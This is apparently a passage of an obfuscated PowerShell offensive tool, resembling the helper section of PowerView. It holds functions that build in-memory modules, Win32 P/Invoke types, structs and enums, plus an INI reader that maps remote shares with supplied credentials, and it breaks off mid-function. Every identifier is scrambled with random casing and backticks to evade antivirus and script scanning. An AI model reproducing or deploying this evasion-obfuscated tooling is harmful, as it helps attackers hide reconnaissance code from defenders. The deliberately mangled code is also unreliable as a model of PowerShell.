












function nEW-`IN`MemORYM`OdulE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${m`ODUL`eNAMe} = [Guid]::NewGuid().ToString()
    )

    ${A`ppd`OM`AIN} = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue(${n`ULl}, @())
    ${lOAdeDA`S`se`mblIes} = ${aPP`dOm`AIn}.GetAssemblies()

    foreach (${as`Se`mbLy} in ${l`O`ADed`AsS`EMBlieS}) {
        if (${asS`eMBLY}.FullName -and (${A`s`se`MBlY}.FullName.Split(',')[0] -eq ${M`OD`ULENA`mE})) {
            return ${as`SE`Mb`lY}
        }
    }

    ${d`YNA`SSem`BLY} = NEW-`ObJ`ect r`e`FLECT`I`oN.as`sembL`yNaMe(${M`ODulENa`me})
    ${Do`ma`iN} = ${aPPD`OM`AIn}
    ${asS`E`MbLYBUIld`er} = ${DOma`in}.DefineDynamicAssembly(${DyNAs`SE`MB`ly}, 'Run')
    ${MOd`UL`E`BuiLDeR} = ${As`se`MbL`YbUiLdeR}.DefineDynamicModule(${m`O`dulENamE}, ${fa`LsE})

    return ${mO`dU`leBuIld`er}
}




function Fu`Nc {
    Param (
        [Parameter(Position = 0, Mandatory = ${Tr`Ue})]
        [String]
        ${DlL`NamE},

        [Parameter(Position = 1, Mandatory = ${T`RUe})]
        [string]
        ${FuN`cTio`N`N`AmE},

        [Parameter(Position = 2, Mandatory = ${TR`UE})]
        [Type]
        ${reTU`RNT`y`pE},

        [Parameter(Position = 3)]
        [Type[]]
        ${paRaM`ETE`Rtyp`ES},

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${n`ATiVe`cAlLinGCO`N`VE`NTIon},

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        ${c`hARSET},

        [String]
        ${Entr`Y`point},

        [Switch]
        ${SEtLaS`T`err`Or}
    )

    ${Pr`ope`RtI`eS} = @{
        DllName = ${DL`lNa`me}
        FunctionName = ${f`UNCT`io`NName}
        ReturnType = ${RE`Turn`TYpe}
    }

    if (${p`A`RaMe`TerTypEs}) { ${P`R`OpEr`TIES}['ParameterTypes'] = ${p`ARaMeT`er`T`ypES} }
    if (${NatIVecaLl`i`NGC`onv`en`TioN}) { ${p`RoPeR`Ti`ES}['NativeCallingConvention'] = ${nAtIVe`c`ALlI`Ng`conVEnTI`oN} }
    if (${CH`A`RSeT}) { ${PrO`p`eRties}['Charset'] = ${cHAr`s`Et} }
    if (${sEtLa`St`erROR}) { ${proP`erti`es}['SetLastError'] = ${SETla`ST`ER`RoR} }
    if (${E`N`Try`pOINt}) { ${pro`PE`RTI`es}['EntryPoint'] = ${E`NTryp`OiNT} }

    N`ew-oB`jE`cT pso`BJe`cT -Property ${PrOp`e`RT`ies}
}


function ADD-`WIn32T`YPe
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=${tr`UE}, ValueFromPipelineByPropertyName=${tr`Ue})]
        [String]
        ${dLL`N`AMe},

        [Parameter(Mandatory=${Tr`UE}, ValueFromPipelineByPropertyName=${T`RUE})]
        [String]
        ${fuNCtiOn`N`Ame},

        [Parameter(ValueFromPipelineByPropertyName=${T`RUE})]
        [String]
        ${e`Ntr`ypoint},

        [Parameter(Mandatory=${T`RUE}, ValueFromPipelineByPropertyName=${t`RUe})]
        [Type]
        ${ReT`Ur`N`TyPE},

        [Parameter(ValueFromPipelineByPropertyName=${Tr`UE})]
        [Type[]]
        ${PArAME`T`ErtYp`Es},

        [Parameter(ValueFromPipelineByPropertyName=${t`RUe})]
        [Runtime.InteropServices.CallingConvention]
        ${NaT`iVeC`Al`lInG`c`onVeNt`iOn} = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=${tR`Ue})]
        [Runtime.InteropServices.CharSet]
        ${c`h`ArSEt} = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=${t`Rue})]
        [Switch]
        ${seTL`As`TerrOr},

        [Parameter(Mandatory=${T`RUE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${m`O`dulE},

        [ValidateNotNull()]
        [String]
        ${N`Am`eSPa`cE} = ''
    )

    BEGIN
    {
        ${t`YPe`HasH} = @{}
    }

    PROCESS
    {
        if (${m`o`DuLe} -is [Reflection.Assembly])
        {
            if (${Name`s`pAcE})
            {
                ${T`YpEH`ASH}[${D`LL`NAMe}] = ${mo`Du`le}.GetType("$Namespace.$DllName")
            }
            else
            {
                ${t`Ype`h`ASH}[${D`Llna`me}] = ${mOd`U`Le}.GetType(${d`llN`AmE})
            }
        }
        else
        {
            
            if (!${ty`Pe`HasH}.ContainsKey(${Dl`l`NaME}))
            {
                if (${NA`Mes`pAce})
                {
                    ${TY`p`EH`Ash}[${d`LLnAME}] = ${mO`d`ULE}.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    ${TYPEha`Sh}[${d`ll`NAMe}] = ${mo`D`ULE}.DefineType(${dL`L`NaMe}, 'Public,BeforeFieldInit')
                }
            }

            ${M`eT`hOd} = ${TyPE`h`ASH}[${d`lL`NAMe}].DefineMethod(
                ${fun`CTI`OnnAME},
                'Public,Static,PinvokeImpl',
                ${RET`URNT`y`Pe},
                ${ParaME`TEr`Ty`P`Es})

            
            ${I} = 1
            foreach(${pA`R`AMeT`eR} in ${P`Aram`EteRTY`P`eS})
            {
                if (${pa`R`AmeTeR}.IsByRef)
                {
                    [void] ${MEt`H`Od}.DefineParameter(${i}, 'Out', ${NU`ll})
                }

                ${I}++
            }

            ${DL`LImPo`RT} = [Runtime.InteropServices.DllImportAttribute]
            ${SeT`L`ASTE`Rro`RFielD} = ${d`ll`IMpOrT}.GetField('SetLastError')
            ${CaL`Li`NgC`ONVENtI`OnFIeLD} = ${DLL`IMpo`RT}.GetField('CallingConvention')
            ${c`H`ArsetF`IELd} = ${Dl`LiMPO`Rt}.GetField('CharSet')
            ${ENTRY`P`oIn`TFIeLd} = ${DlL`IM`Po`RT}.GetField('EntryPoint')
            if (${Se`TlAS`TErRoR}) { ${S`leVAL`UE} = ${tR`UE} } else { ${S`leVAl`UE} = ${FaL`SE} }

            if (${pSBOu`NDParam`et`e`Rs}['EntryPoint']) { ${eXPort`edFU`Ncn`Ame} = ${Ent`Ry`POint} } else { ${e`X`p`ORtedfU`NCN`Ame} = ${fu`N`ctION`N`Ame} }

            
            ${c`oNsTR`U`CTOR} = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            ${DLlIm`po`R`T`A`TtrIb`UTE} = ne`w-`oBj`ect rEFlEC`TioN`.`em`IT.C`UstOm`AttRI`BU`Teb`UiLdEr(${CON`sTRuCt`oR},
                ${DLlN`A`me}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${S`eTlaSTer`Ror`FiEld},
                                           ${cALlI`NgCOnv`E`N`TI`on`FIElD},
                                           ${ChAR`Se`TfieLD},
                                           ${E`N`TR`YPOintfIE`lD}),
                [Object[]] @(${s`lEVAL`Ue},
                             ([Runtime.InteropServices.CallingConvention] ${naT`Iv`EcaL`lin`g`CoNV`ENTI`on}),
                             ([Runtime.InteropServices.CharSet] ${CHa`Rs`ET}),
                             ${EXPORt`ed`F`UNcNAmE}))

            ${MeTh`Od}.SetCustomAttribute(${DlL`iM`P`or`TAttrIbU`Te})
        }
    }

    END
    {
        if (${m`od`UlE} -is [Reflection.Assembly])
        {
            return ${t`ypEhA`sh}
        }

        ${R`E`T`URnTYPES} = @{}

        foreach (${k`Ey} in ${t`YPehAsH}.Keys)
        {
            ${tY`PE} = ${T`yP`EhA`SH}[${k`ey}].CreateType()

            ${R`EtU`RNTyPes}[${K`eY}] = ${tY`PE}
        }

        return ${rETUrNTy`p`eS}
    }
}


function pSEN`UM {


    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=${tr`Ue})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${mo`DU`Le},

        [Parameter(Position = 1, Mandatory=${Tr`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${F`Ul`Lna`me},

        [Parameter(Position = 2, Mandatory=${TR`UE})]
        [Type]
        ${T`yPE},

        [Parameter(Position = 3, Mandatory=${T`RUE})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${enuMeLE`m`EnTS},

        [Switch]
        ${b`IT`FiELD}
    )

    if (${MOdu`LE} -is [Reflection.Assembly])
    {
        return (${mO`DUlE}.GetType(${Full`N`AMe}))
    }

    ${eNU`Mt`yPE} = ${TY`pE} -as [Type]

    ${eNu`M`BuILDer} = ${m`ODUle}.DefineEnum(${full`Na`me}, 'Public', ${en`UMt`y`PE})

    if (${bI`TfiE`ld})
    {
        ${fLagsCO`Nst`RUc`T`oR} = [FlagsAttribute].GetConstructor(@())
        ${F`LAG`SC`US`TO`mAttrI`BuTE} = n`ew-`OBjeCt R`eflECTiON`.E`mIT.c`US`Tom`A`TTRiBut`Ebui`LdER(${FlAg`SC`o`Ns`TRuc`ToR}, @())
        ${ENUMB`U`iLder}.SetCustomAttribute(${FlAgSCUst`OMa`T`T`R`Ibute})
    }

    foreach (${k`EY} in ${E`Nu`mElEm`ENTs}.Keys)
    {
        
        ${Nu`lL} = ${ENUmb`Uild`er}.DefineLiteral(${K`eY}, ${e`NU`M`ELeMENts}[${K`EY}] -as ${EnuMT`YPE})
    }

    ${e`N`UMBuilDEr}.CreateType()
}




function fi`eld {
    Param (
        [Parameter(Position = 0, Mandatory=${tR`UE})]
        [UInt16]
        ${P`oSIT`ION},

        [Parameter(Position = 1, Mandatory=${t`RUE})]
        [Type]
        ${t`YPE},

        [Parameter(Position = 2)]
        [UInt16]
        ${o`FfS`ET},

        [Object[]]
        ${M`ARS`halAs}
    )

    @{
        Position = ${P`os`ITiOn}
        Type = ${tY`pE} -as [Type]
        Offset = ${of`FSET}
        MarshalAs = ${m`ArSHA`Las}
    }
}


function S`Tr`Uct
{


    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=${t`RUe})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${Mo`D`UlE},

        [Parameter(Position = 2, Mandatory=${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${FU`L`lNAME},

        [Parameter(Position = 3, Mandatory=${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${STRU`c`TF`ie`LdS},

        [Reflection.Emit.PackingSize]
        ${P`ACKIN`GSIZe} = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        ${EXpL`ICiTl`A`yOuT}
    )

    if (${moD`U`LE} -is [Reflection.Assembly])
    {
        return (${mo`DULE}.GetType(${F`ULln`AmE}))
    }

    [Reflection.TypeAttributes] ${StRUc`TAt`T`Rib`UTes} = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if (${exPlic`itL`AY`oUt})
    {
        ${sTru`cTaTT`RIbu`TeS} = ${S`T`RUct`A`TtRIbut`ES} -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        ${S`T`RuCTAtTRiBuT`Es} = ${S`T`RUCTatTri`Bu`TeS} -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    ${S`T`RuCTBUiLdER} = ${M`O`dule}.DefineType(${fUl`LNA`ME}, ${S`T`RUCTATtrIBU`T`es}, [ValueType], ${p`Ac`KiNG`sIze})
    ${Co`NStr`Uc`ToRinFo} = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    ${siZEco`N`ST} = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    ${FI`ElDs} = n`e`W-`ObjEct hasHtAB`l`e[](${S`T`RucTfI`ELdS}.Count)

    
    
    
    foreach (${F`ieLd} in ${s`Tru`ctFI`ELds}.Keys)
    {
        ${in`d`ex} = ${Str`U`ctF`IeLds}[${fI`e`LD}]['Position']
        ${fi`ELDS}[${I`ND`eX}] = @{FieldName = ${fI`eLD}; Properties = ${s`Tru`cTfI`ELds}[${fI`e`Ld}]}
    }

    foreach (${fIE`lD} in ${FIEL`ds})
    {
        ${fie`ldnA`ME} = ${fIe`LD}['FieldName']
        ${F`i`elDpR`OP} = ${fi`ELD}['Properties']

        ${o`Ff`sEt} = ${f`Ie`Ldp`RoP}['Offset']
        ${ty`pe} = ${fIEl`dP`R`Op}['Type']
        ${MA`RS`hALAS} = ${Fi`ELd`p`ROP}['MarshalAs']

        ${ne`wfI`e`lD} = ${StRuCTbu`I`LDeR}.DefineField(${fIe`Ld`NaMe}, ${T`ype}, 'Public')

        if (${M`A`RShALAs})
        {
            ${u`NMANAG`E`Dt`YPE} = ${MaRS`HA`laS}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${ma`Rs`hALas}[1])
            {
                ${si`zE} = ${marShA`l`AS}[1]
                ${ATtr`ib`BUIL`d`er} = ne`W`-OBjecT rEF`l`EC`T`IOn`.emi`T.`Cu`St`oMATtRIbuTeBu`IldEr(${c`o`NstrUCt`OrIN`Fo},
                    ${U`N`MAnaGedTypE}, ${SiZe`c`onsT}, @(${S`iZe}))
            }
            else
            {
                ${ATTr`ibBu`i`ldEr} = NE`W-`o`Bject REF`LeCtIoN.`emit.`C`USt`O`m`AttRiBUteB`UilDEr(${C`O`NstRUctOrI`Nfo}, [Object[]] @(${uNmAN`Ag`E`D`TyPe}))
            }

            ${neWF`Ie`ld}.SetCustomAttribute(${ATtRib`B`UILd`eR})
        }

        if (${eX`PlICITl`AYout}) { ${neW`FiE`LD}.SetOffset(${o`F`FsET}) }
    }

    
    
    ${siZ`E`mE`THod} = ${S`TRuCTbuil`D`ER}.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    ${Il`g`EnErA`ToR} = ${SiZ`eme`THOD}.GetILGenerator()
    
    ${iLg`Ener`AT`OR}.Emit([Reflection.Emit.OpCodes]::Ldtoken, ${stRUc`T`BUil`deR})
    ${iL`gEnerat`oR}.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    ${iLG`eNE`RA`Tor}.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    ${Il`gEn`eR`AtoR}.Emit([Reflection.Emit.OpCodes]::Ret)

    
    
    ${imPl`ICiT`coNv`ErT`ER} = ${s`TRUCtBUI`LDer}.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        ${St`RUcT`BUi`Ld`ER},
        [Type[]] @([IntPtr]))
    ${IlG`eNErat`OR2} = ${IMpl`I`Ci`Tco`NV`ErTeR}.GetILGenerator()
    ${iL`geNEr`AT`oR2}.Emit([Reflection.Emit.OpCodes]::Nop)
    ${ILgeNe`RA`T`Or2}.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    ${IlGE`Ner`AToR2}.Emit([Reflection.Emit.OpCodes]::Ldtoken, ${s`TRUcT`BUil`der})
    ${i`lgen`ERaTOr2}.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    ${IlgENE`R`A`ToR2}.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    ${IL`GeN`E`RATOR2}.Emit([Reflection.Emit.OpCodes]::Unbox_Any, ${Str`UctBUild`ER})
    ${iLgEN`ERaTO`R2}.Emit([Reflection.Emit.OpCodes]::Ret)

    ${s`TRuC`TbuIl`DEr}.CreateType()
}








Function n`e`w`-d`YNAmiCParaMetEr {


    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = ${t`RuE}, ValueFromPipeline = ${Tr`Ue}, ValueFromPipelineByPropertyName = ${Tr`Ue}, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]${n`Ame},

        [Parameter(ValueFromPipelineByPropertyName = ${T`RuE}, ParameterSetName = 'DynamicParameter')]
        [System.Type]${tY`Pe} = [int],

        [Parameter(ValueFromPipelineByPropertyName = ${T`RuE}, ParameterSetName = 'DynamicParameter')]
        [string[]]${alI`AS},

        [Parameter(ValueFromPipelineByPropertyName = ${t`RuE}, ParameterSetName = 'DynamicParameter')]
        [switch]${M`And`AtoRY},

        [Parameter(ValueFromPipelineByPropertyName = ${tr`UE}, ParameterSetName = 'DynamicParameter')]
        [int]${p`OSiTIOn},

        [Parameter(ValueFromPipelineByPropertyName = ${Tr`UE}, ParameterSetName = 'DynamicParameter')]
        [string]${He`LPm`esSA`gE},

        [Parameter(ValueFromPipelineByPropertyName = ${t`RuE}, ParameterSetName = 'DynamicParameter')]
        [switch]${do`NtSh`Ow},

        [Parameter(ValueFromPipelineByPropertyName = ${Tr`Ue}, ParameterSetName = 'DynamicParameter')]
        [switch]${vALU`eFRoMPi`PeLi`Ne},

        [Parameter(ValueFromPipelineByPropertyName = ${t`RUE}, ParameterSetName = 'DynamicParameter')]
        [switch]${ValUE`F`RoMPiPEliN`EBY`pr`oP`E`RTYname},

        [Parameter(ValueFromPipelineByPropertyName = ${Tr`UE}, ParameterSetName = 'DynamicParameter')]
        [switch]${ValUEfr`oMREm`AI`NINgaRgu`meNts},

        [Parameter(ValueFromPipelineByPropertyName = ${T`RUe}, ParameterSetName = 'DynamicParameter')]
        [string]${P`ARAmETerse`Tn`AMe} = '__AllParameterSets',

        [Parameter(ValueFromPipelineByPropertyName = ${T`RUe}, ParameterSetName = 'DynamicParameter')]
        [switch]${aL`LoWn`U`Ll},

        [Parameter(ValueFromPipelineByPropertyName = ${tR`Ue}, ParameterSetName = 'DynamicParameter')]
        [switch]${Al`lo`wEmPt`YST`RiNG},

        [Parameter(ValueFromPipelineByPropertyName = ${t`RUe}, ParameterSetName = 'DynamicParameter')]
        [switch]${a`LLoWem`ptYCO`lLeCtI`On},

        [Parameter(ValueFromPipelineByPropertyName = ${TR`UE}, ParameterSetName = 'DynamicParameter')]
        [switch]${val`id`AteNOtNu`LL},

        [Parameter(ValueFromPipelineByPropertyName = ${tR`Ue}, ParameterSetName = 'DynamicParameter')]
        [switch]${Val`IDat`En`ot`N`ULLoReMpTy},

        [Parameter(ValueFromPipelineByPropertyName = ${TR`Ue}, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]${V`ALId`AteCoUNt},

        [Parameter(ValueFromPipelineByPropertyName = ${T`RUe}, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]${Va`LId`Ater`ANGE},

        [Parameter(ValueFromPipelineByPropertyName = ${TR`Ue}, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]${VAL`I`da`Tel`ENGTh},

        [Parameter(ValueFromPipelineByPropertyName = ${T`RuE}, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]${VALI`D`ATEPA`T`TerN},

        [Parameter(ValueFromPipelineByPropertyName = ${Tr`UE}, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]${va`LId`ATeSc`Ript},

        [Parameter(ValueFromPipelineByPropertyName = ${T`RuE}, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]${Val`iDat`ESEt},

        [Parameter(ValueFromPipelineByPropertyName = ${TR`Ue}, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!(${_} -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            ${Tr`UE}
        })]
        ${dIcT`IO`N`Ary} = ${fAL`Se},

        [Parameter(Mandatory = ${T`Rue}, ValueFromPipelineByPropertyName = ${Tr`UE}, ParameterSetName = 'CreateVariables')]
        [switch]${cR`EateVar`ia`BLeS},

        [Parameter(Mandatory = ${tr`Ue}, ValueFromPipelineByPropertyName = ${TR`UE}, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            
            
            if(${_}.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            ${tR`UE}
        })]
        ${bO`UN`dPa`RA`mEt`Ers}
    )

    Begin {
        ${IntERn`ALdI`Ct`I`o`NaRy} = NEW-o`B`ject -TypeName syStem.`ma`NAgemEn`T`.AUtoMA`TIoN.R`UNTiMe`de`FiNedPA`RaMETeRDI`c`TioNa`RY
        function _`TEMP { [CmdletBinding()] Param() }
        ${CoMMOnParA`mEt`e`RS} = (G`et-cOM`mANd _`TeMp).Parameters.Keys
    }

    Process {
        if(${CR`EaTEvar`i`ABlEs}) {
            ${bO`UNDKe`YS} = ${BoUndpa`RAMEtE`RS}.Keys | WH`eRE-oBJ`e`cT { ${C`om`M`OnPaRAme`Te`RS} -notcontains ${_} }
            ForEach(${Pa`RA`MEt`ER} in ${B`oUnD`KEYs}) {
                if (${P`ArAmE`TER}) {
                    s`eT-varI`ABLE -Name ${p`ARAMeT`eR} -Value ${Bo`UN`dpARa`Me`TERS}.${p`ArA`mETeR} -Scope 1 -Force
                }
            }
        }
        else {
            ${s`T`AlEkEYs} = @()
            ${Sta`lEK`eys} = ${psBo`Un`DPAr`AmEteRs}.GetEnumerator() |
                        fO`ReaCH-O`B`jE`cT {
                            if(${_}.Value.PSobject.Methods.Name -match '^Equals$') {
                                
                                if(!${_}.Value.Equals((Get-v`Ar`iAbLe -Name ${_}.Key -ValueOnly -Scope 0))) {
                                    ${_}.Key
                                }
                            }
                            else {
                                
                                if(${_}.Value -ne (geT`-`Var`IABLE -Name ${_}.Key -ValueOnly -Scope 0)) {
                                    ${_}.Key
                                }
                            }
                        }
            if(${sTA`leK`Eys}) {
                ${STa`LEKe`Ys} | For`E`ACh-`Object {[void]${P`SBOU`ND`p`AraMEters}.Remove(${_})}
            }

            
            ${unB`oUN`DPAraMet`e`RS} = (gEt-C`oMmA`Nd -Name (${PsC`Mdl`ET}.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        
                                        Whe`R`e-ObJe`cT { ${_}.Value.ParameterSets.Keys -contains ${Ps`cm`DlEt}.ParameterSetName } |
                                            sel`ect-O`BjECT -ExpandProperty k`eY |
                                                
                                                WHer`e-`objEct { ${ps`Boun`dp`Aram`eT`erS}.Keys -notcontains ${_} }

            
            ${T`Mp} = ${Nu`lL}
            ForEach (${P`Ar`A`mETer} in ${uNbo`UND`P`ARaM`eT`erS}) {
                ${d`ef`AuLtVal`Ue} = Ge`T-VaRI`AB`LE -Name ${P`A`Ra`mETer} -ValueOnly -Scope 0
                if(!${ps`BOu`N`DpaRamETe`RS}.TryGetValue(${Pa`RamE`TEr}, [ref]${T`mP}) -and ${D`E`FAul`TVal`UE}) {
                    ${P`s`BoUndPARamE`Ters}.${p`A`RamE`TeR} = ${dEF`AULtVAl`Ue}
                }
            }

            if(${d`iCti`oNARY}) {
                ${D`pdi`CTI`ONAry} = ${DiCt`IoN`Ary}
            }
            else {
                ${dP`DIC`T`IonaRY} = ${inTErNal`dICti`ON`ARy}
            }

            
            ${g`ETV`AR} = {geT`-v`Ar`iABLE -Name ${_} -ValueOnly -Scope 0}

            
            ${Att`Ri`B`UT`eRegEX} = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            ${v`AlI`DaTIoN`REGeX} = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            ${AL`iAs`R`eGeX} = '^Alias$'
            ${paRaMet`erAT`T`RI`BUTE} = nEw-ObJ`E`CT -TypeName systEm.`MANa`g`EMent`.A`Ut`oMATi`o`N.ParAMet`E`RA`TTr`iBUtE

            switch -regex (${pSbO`Und`pAR`Am`et`ers}.Keys) {
                ${aTTR`IBut`erEG`Ex} {
                    Try {
                        ${PAR`AMeteRAt`T`R`iB`Ute}.${_} = . ${g`E`TvaR}
                    }
                    Catch {
                        ${_}
                    }
                    continue
                }
            }

            if(${d`PDiCt`IOna`RY}.Keys -contains ${NA`Me}) {
                ${D`PdI`CtIonary}.${na`ME}.Attributes.Add(${pARam`e`T`E`RAT`TRibUte})
            }
            else {
                ${A`TtR`I`BuTEcOl`Le`ct`ION} = nEw`-OBj`E`cT -TypeName Co`LLe`CT`I`ONS.OBjectmODeL.cOLl`eCtIon`[`SYsTEM.`ATT`R`iButE]
                switch -regex (${psBOuNd`Pa`Ra`m`Ete`RS}.Keys) {
                    ${VA`l`id`AtiO`NRegEX} {
                        Try {
                            ${PA`R`A`mEtERoPTIONS} = NEw-Ob`j`eCt -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. ${g`Et`VAR}) -ErrorAction s`Top
                            ${A`TtRibuteCOL`L`Ect`i`On}.Add(${Pa`Ram`EterOp`TIoNS})
                        }
                        Catch { ${_} }
                        continue
                    }
                    ${Al`ia`sr`EgeX} {
                        Try {
                            ${paraM`ETeraL`iAs} = N`EW-oBj`ecT -TypeName sY`steM.ma`N`AgEment.A`UToMATiO`N.`ALi`As`At`TrI`BUTE -ArgumentList (. ${gETv`Ar}) -ErrorAction S`ToP
                            ${AT`TribUTe`COll`Ec`T`IoN}.Add(${pAr`AmeT`ERa`LiAS})
                            continue
                        }
                        Catch { ${_} }
                    }
                }
                ${ATtR`IBUT`eC`oL`L`ecTIon}.Add(${PAramE`Ter`ATTRIBU`Te})
                ${PA`R`AM`etER} = New-`Ob`ject -TypeName S`ysT`em`.MANAGEmenT.`AU`TO`MaT`I`o`N.R`Un`TI`M`EdefInE`DPARAMeTeR -ArgumentList @(${NA`ME}, ${T`yPE}, ${A`TtRIb`Ut`ecOlLE`CTI`On})
                ${dPd`ic`Tio`NArY}.Add(${NA`Me}, ${P`A`RamETEr})
            }
        }
    }

    End {
        if(!${CR`eAt`evAR`IABLes} -and !${DI`cT`iONary}) {
            ${D`Pd`iCTI`o`NaRy}
        }
    }
}


function G`ET-iNI`COn`TEnT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${T`Rue}, ValueFromPipeline = ${tr`UE}, ValueFromPipelineByPropertyName = ${tR`UE})]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`ATh},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REdEn`TiaL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${ouT`P`U`TobJe`Ct}
    )

    BEGIN {
        ${m`APPEDCo`M`PUTErs} = @{}
    }

    PROCESS {
        ForEach (${TAR`ge`TPa`Th} in ${Pa`Th}) {
            if ((${tA`RGet`p`ATh} -Match '\\\\.*\\.*') -and (${Psb`o`UNdpaRAM`Et`e`RS}['Credential'])) {
                ${HoSTCOMpU`T`ER} = (N`ew-O`BJECt S`ystEM`.uri(${tA`Rg`etPa`Th})).Host
                if (-not ${maP`p`e`DcOmpuT`eRs}[${hOs`T`C`o`mpUTER}]) {
                    
                    ADd-Re`mo`T`eC`oNn`ec`TIoN -ComputerName ${H`O`stcOMPUT`eR} -Credential ${CR`ed`eN`TiaL}
                    ${maPpED`CoMpUtE`Rs}[${h`OSt`compUT`Er}] = ${Tr`Ue}
                }
            }

            if (T`EST-Pa`Th -Path ${tA`RgeTP`ATH}) {
                if (${ps`BoUND`PaR`Am`eT`ERs}['OutputObject']) {
                    ${InI`ObjE`Ct} = ne`W-Obj`ecT Ps`o`BjEct
                }
                else {
                    ${i`N`IObJE`cT} = @{}
                }
                Switch -Regex -File ${ta`RGEtP`ATH} {
                    "^\[(.+)\]" 
                    {
                        ${s`ecTI`ON} = ${M`A`TcHeS}[1].Trim()
                        if (${psBo`Un`DPaR`AMe`TeRS}['OutputObject']) {
                            ${SEcT`I`oN} = ${se`c`Tion}.Replace(' ', '')
                            ${S`eCTionO`BJ`eCT} = NEw`-oBj`E`ct psob`JE`ct
                            ${iN`I`ObjeCT} | aDD`-`M`emBEr note`Pr`Op`eRTY ${se`ct`ion} ${sE`ct`iONObje`CT}
                        }
                        else {
                            ${InI`o`BJeCT}[${S`Ect`iOn}] = @{}
                        }
                        ${comMENt`c`O`U`NT} = 0
                    }
                    "^(;.*)$" 
                    {
                        ${vA`luE} = ${mA`TCH`ES}[1].Trim()
                        ${CoMM`ent`cOUNT} = ${CoMM`en`TcouNT} + 1
                        ${NA`me} = 'Comment' + ${cOMme`Nt`cOu`NT}
                        if (${PS`B`o`UNDpa`RAM`eTErs}['OutputObject']) {
                            ${n`AMe} = ${N`AMe}.Replace(' ', '')
                            ${iniobj`e`CT}.${Sect`iON} | Ad`D-mE`mBer NotePR`oP`ERty ${NA`ME} ${v`A`LUE}
                        }
                        else {
                            ${inio`Bj`ecT}[${sEc`T`iOn}][${na`Me}] = ${v`Al`UE}
                        }
                    }
                    "(.+?)\s*=(.*)" 
                    {
                        ${na`mE}, ${VaL`UE} = ${mAtc`h`ES}[1..2]
